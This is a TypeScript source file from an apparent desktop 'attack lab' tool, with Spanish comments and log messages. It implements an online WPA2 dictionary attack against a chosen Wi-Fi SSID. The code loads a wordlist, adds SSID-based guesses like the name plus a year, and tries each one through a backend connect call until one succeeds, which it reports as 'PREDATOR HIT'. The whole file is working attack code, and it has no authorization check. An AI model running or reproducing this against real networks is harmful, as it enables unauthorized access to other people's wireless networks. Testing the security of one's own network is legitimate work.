// src/ui/features/attack_lab/catalog/scenarios/wifi/wifiDictionaryAttack.ts
// Escenario WIFI nativo: ataque de diccionario WPA2 usando wordlist del sistema (backend) + heuristicas y logs trazables.

import { invoke } from "@tauri-apps/api/core";
import type { WifiNetworkDTO } from "../../../../../../shared/dtos/NetworkDTOs";
import type { AttackLabScenario } from "../../types";

export const wifiDictionaryAttackScenario: AttackLabScenario = {
  id: "wifi_brute_force_dict",
  title: "WIFI: Attack (Dictionary)",
  description: "Ataque activo de diccionario contra WPA2. Usa wordlist personalizada del sistema.",
  mode: "native",
  category: "WIFI",
  isSupported: () => ({ supported: true }),
  executeNative: async ({ target, onLog, signal }) => {
    const ssid = target;
    onLog("stdout", `⚔️ INICIANDO SECUENCIA DE ATAQUE contra: [ ${ssid} ]`);
    onLog("stdout", "📥 Cargando diccionario desde el sistema de archivos...");

    let dictionary: string[] = [];

    try {
      dictionary = await invoke<string[]>("get_dictionary");
      onLog("stdout", `✅ Diccionario cargado: ${dictionary.length} palabras base.`);
    } catch (e) {
      onLog("stderr", `⚠️ Error cargando diccionario (usando fallback memoria): ${e}`);
      dictionary = ["12345678", "password", "admin1234"]; // Fallback de emergencia
    }

    // Variaciones dinámicas (heurística en tiempo real)
    const heuristic = [ssid, ssid + "123", ssid + "2024", ssid + "2025"];
    dictionary.push(...heuristic);

    // Eliminar duplicados generados por la heurística
    dictionary = [...new Set(dictionary)];

    onLog("stdout", `📚 Total vectores a probar: ${dictionary.length}`);
    onLog("stdout", "------------------------------------------------");

    for (const [index, pass] of dictionary.entries()) {
      if (signal?.aborted) {
        onLog("stderr", "🛑 ATAQUE ABORTADO POR EL USUARIO.");
        break;
      }

      const attemptNumber = index + 1;
      onLog("stdout", `🔑 Probando: ${pass}`);
      onLog("stdout", `🧪 TRACE intento ${attemptNumber}/${dictionary.length} -> SSID='${ssid}' PASS_LEN=${pass.length}`);

      try {
        const startedAt = performance.now();
        const success = await invoke<boolean>("wifi_connect", { ssid, password: pass });
        const elapsedMs = Math.round(performance.now() - startedAt);
        onLog("stdout", `🧪 TRACE wifi_connect result=${success} elapsedMs=${elapsedMs}`);

        if (success) {
          onLog("stdout", "------------------------------------------------");
          onLog("stdout", `🔓 PREDATOR HIT! PASSWORD ENCONTRADA: [ ${pass} ]`);
          onLog("stdout", `✅ Conectado exitosamente a ${ssid}.`);
          return;
        }

        onLog("stderr", `❌ Fallo auth: ${pass}`);
        try {
          const airwaves = await invoke<WifiNetworkDTO[]>("scan_airwaves");
          const targetIntel = airwaves.find((n) => n.ssid.toLowerCase() === ssid.toLowerCase());
          if (targetIntel) {
            onLog(
              "stdout",
              `🧪 TRACE post-fallo ssid='${targetIntel.ssid}' connected=${targetIntel.isConnected} bssid=${targetIntel.bssid} signal=${targetIntel.signalLevel} security=${targetIntel.securityType}`,
            );
          } else {
            onLog("stdout", "🧪 TRACE post-fallo target no visible en scan_airwaves");
          }
        } catch (scanError) {
          onLog("stderr", `🧪 TRACE post-fallo scan_airwaves error: ${scanError}`);
        }
      } catch (e) {
        onLog("stderr", `⚠️ Error driver: ${e}`);
      }

      // Delay de seguridad
      await new Promise((r) => setTimeout(r, 1500));
    }

    if (!signal?.aborted) {
      onLog("stderr", "💀 DICCIONARIO AGOTADO. Ataque fallido.");
    }

    onLog("stdout", "------------------------------------------------");
    onLog("stdout", "ℹ️ Windows intentará reconectar a tu red habitual.");
  },
};

